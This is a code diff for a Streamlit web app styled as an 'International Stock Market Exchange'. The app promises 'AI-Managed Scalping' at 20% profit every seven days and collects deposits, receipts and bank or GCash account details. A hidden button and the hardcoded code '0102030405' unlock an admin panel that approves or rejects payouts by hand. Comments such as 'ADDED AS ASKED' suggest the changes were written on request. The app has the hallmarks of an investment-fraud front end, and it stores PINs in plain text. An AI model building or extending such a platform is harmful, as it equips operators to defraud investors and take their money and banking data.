@@ -40,11 +40,7 @@ st.markdown("""
         background-color: transparent !important; border: none !important; color: #8c8f99 !important;
         font-size: 15px !important; padding: 0 !important; margin-left: -5px !important; display: inline !important;
     }
-    .big-title {
-        text-align:center; font-size:45px; font-weight:900; 
-        background:linear-gradient(90deg, #ff007f, #ffaa00, #00ff88, #00eeff); 
-        -webkit-background-clip: text; color: transparent; margin-bottom:20px;
-    }
+    .hist-card { background: #1c1e26; padding: 10px; border-radius: 5px; margin-bottom: 8px; border-left: 5px solid #444; }
     </style>
     """, unsafe_allow_html=True)
 
@@ -56,19 +52,17 @@ st.markdown("""
 if st.session_state.is_boss:
     st.title("👑 ADMIN CONTROL CENTER")
     if st.button("EXIT ADMIN"):
-        st.session_state.is_boss = False; st.rerun()
+        st.session_state.is_boss = False
+        st.rerun()
     
     reg = load_registry()
     st.subheader("🔔 PENDING APPROVALS")
     found_pending = False
     for username, u_data in reg.items():
-        # Admin looks for 'pending_actions' list
         pending_list = u_data.get('pending_actions', [])
         for idx, action in enumerate(pending_list):
             found_pending = True
-            with st.expander(f"{action['type']} - {username}"):
-                st.write(f"**Amount:** ₱{action.get('amount', 0):,.2f}")
-                st.write(f"**Date:** {action.get('date')}")
+            with st.expander(f"{action['type']} - {username} (₱{action.get('amount', 0):,.2f})"):
                 if action['type'] == "WITHDRAW":
                     st.write(f"**Bank:** {action['bank']} | **Acc:** {action['acc_num']}")
                 
@@ -77,11 +71,11 @@ if st.session_state.is_boss:
                     if action['type'] == "DEPOSIT":
                         u_data.setdefault('inv', []).append({"amount": action['amount'], "start_time": datetime.now().isoformat()})
                     u_data['pending_actions'].pop(idx)
-                    update_user(username, u_data); st.success("Approved!"); st.rerun()
+                    update_user(username, u_data); st.rerun()
                 if cr.button("❌ REJECT", key=f"rej_{username}_{idx}"):
                     if action['type'] == "WITHDRAW": u_data['wallet'] += action['amount']
                     u_data['pending_actions'].pop(idx)
-                    update_user(username, u_data); st.warning("Rejected!"); st.rerun()
+                    update_user(username, u_data); st.rerun()
 
     if not found_pending: st.info("No pending requests.")
     st.divider()
@@ -116,46 +110,49 @@ elif st.session_state.user:
     if c2.button("💸 WITHDRAW"): st.session_state.action_type = "WITH"
     if c3.button("♻️ REINVEST"): st.session_state.action_type = "REIN"
 
-    # DEPOSIT FORM (SENT TO ADMIN)
     if st.session_state.action_type == "DEP":
-        with st.form("d_form"):
-            st.write("### Deposit Request")
-            amt_d = st.number_input("Amount", min_value=100.0)
-            st.file_uploader("Browse Receipt", type=['jpg','png','jpeg'])
-            if st.form_submit_button("Submit Deposit"):
-                data.setdefault('pending_actions', []).append({
-                    "type":"DEPOSIT", "amount":amt_d, "date":str(datetime.now())
-                })
-                update_user(st.session_state.user, data)
-                st.success("Sent to Admin!"); st.session_state.action_type = None; st.rerun()
+        with st.form("d"):
+            amt_d = st.number_input("Deposit Amount", min_value=100.0)
+            st.file_uploader("Browse Receipt", type=['jpg','png','jpeg']) # ADDED AS ASKED
+            if st.form_submit_button("Submit"):
+                data.setdefault('pending_actions', []).append({"type": "DEPOSIT", "amount": amt_d, "date": str(datetime.now())})
+                update_user(st.session_state.user, data); st.success("Sent!"); st.session_state.action_type = None; st.rerun()
 
-    # WITHDRAW FORM (SENT TO ADMIN)
     if st.session_state.action_type == "WITH":
         if data['wallet'] < 100:
-            st.error("❌ Need ₱100.00 minimum.")
+            st.error("❌ Need ₱100.00")
             if st.button("Close"): st.session_state.action_type = None; st.rerun()
         else:
-            with st.form("w_form"):
+            with st.form("w"):
                 amt_w = st.number_input("Amount", min_value=100.0, max_value=float(data['wallet']))
-                bn = st.text_input("Bank/GCash")
-                an = st.text_input("Account Name")
-                anum = st.text_input("Number")
+                bn, an, anum = st.text_input("Bank"), st.text_input("Name"), st.text_input("Number")
                 if st.form_submit_button("Request"):
                     data['wallet'] -= amt_w
-                    data.setdefault('pending_actions', []).append({
-                        "type":"WITHDRAW", "amount":amt_w, "bank":bn, 
-                        "acc_name":an, "acc_num":anum, "date":str(datetime.now())
-                    })
-                    update_user(st.session_state.user, data)
-                    st.success("Sent to Admin!"); st.session_state.action_type = None; st.rerun()
+                    data.setdefault('pending_actions', []).append({"type": "WITHDRAW", "amount": amt_w, "bank": bn, "acc_num": anum, "date": str(datetime.now())})
+                    update_user(st.session_state.user, data); st.session_state.action_type = None; st.rerun()
 
-# --- ROUTE C: LOGIN / REGISTER ---
+    # --- TRANSACTION HISTORY SECTION (ADDED AS ASKED) ---
+    st.markdown("### 📜 TRANSACTION HISTORY")
+    tabs = st.tabs(["⏳ Waiting", "✅ Approved"])
+    
+    with tabs[0]: # Waiting Approval
+        pending = data.get('pending_actions', [])
+        if not pending: st.info("No waiting approvals.")
+        for p in pending:
+            st.markdown(f"<div class='hist-card' style='border-left-color:#ffaa00;'><b>{p['type']}</b>: ₱{p['amount']:,.2f}<br><small>{p['date'][:16]}</small></div>", unsafe_allow_html=True)
+            
+    with tabs[1]: # Approved / Active
+        active = data.get('inv', [])
+        if not active: st.info("No active investments.")
+        for a in active:
+            st.markdown(f"<div class='hist-card' style='border-left-color:#00ff88;'><b>ACTIVE INVESTMENT</b>: ₱{a['amount']:,.2f}<br><small>Started: {a['start_time'][:16]}</small></div>", unsafe_allow_html=True)
+
+# --- ROUTE C: LOGIN ---
 elif st.session_state.page == "login":
     st.markdown("<h1 style='text-align:center;'>ACCESS PORTAL</h1>", unsafe_allow_html=True)
     c1, c2 = st.columns(2)
     if c1.button("LOG IN"): st.session_state.sub_page = "l_form"
     if c2.button("REGISTER"): st.session_state.sub_page = "r_form"
-    
     if st.session_state.sub_page == "l_form":
         u, p = st.text_input("USERNAME").upper().strip(), st.text_input("PIN", type="password")
         if st.button("ENTER"):
@@ -164,23 +161,18 @@ elif st.session_state.page == "login":
             if ud and str(ud['pin']) == str(p):
                 st.session_state.user = u.replace(" ", "_"); st.rerun()
     elif st.session_state.sub_page == "r_form":
-        f, l, p = st.text_input("FIRST").upper(), st.text_input("LAST").upper(), st.text_input("6-DIGIT PIN", type="password")
+        f, l, p = st.text_input("FIRST").upper(), st.text_input("LAST").upper(), st.text_input("PIN", type="password")
         if st.button("SUBMIT"):
-            update_user(f"{f}_{l}", {"pin":p,"wallet":0.0,"inv":[],"full_name":f"{f} {l}","pending_actions":[]})
-            st.success("Success!"); st.session_state.sub_page = "l_form"; st.rerun()
+            update_user(f"{f}_{l}", {"pin": p, "wallet": 0.0, "inv": [], "full_name": f"{f} {l}", "pending_actions": []})
+            st.success("Registered!"); st.session_state.sub_page = "l_form"; st.rerun()
 
-# --- ROUTE D: AD FRONT PAGE ---
+# --- ROUTE D: AD FRONT ---
 else:
-    st.markdown('<h1 class="big-title">INTERNATIONAL STOCK MARKET EXCHANGE</h1>', unsafe_allow_html=True)
-    cl, cb1, cb2, cr = st.columns([0.3, 0.1, 0.3, 0.3])
-    with cb1:
-        if st.button("⛔"): st.session_state.admin_mode = not st.session_state.admin_mode
-    with cb2:
-        if st.button("🚀 JOIN NOW!", use_container_width=True): 
-            st.session_state.page = "login"; st.rerun()
-
+    st.markdown('<h1 style="text-align:center;">INTERNATIONAL STOCK MARKET EXCHANGE</h1>', unsafe_allow_html=True)
+    col_a, col_b = st.columns([0.1, 0.9])
+    if col_a.button("⛔"): st.session_state.admin_mode = not st.session_state.admin_mode
+    if col_b.button("🚀 JOIN NOW"): st.session_state.page = "login"; st.rerun()
     st.markdown('<div class="ad-panel"><h3>AI-Managed Scalping</h3><p>20% Profit / 7 Days</p></div>', unsafe_allow_html=True)
-
     if st.session_state.admin_mode:
         if st.text_input("Code", type="password") == "0102030405":
             st.session_state.is_boss = True; st.rerun()
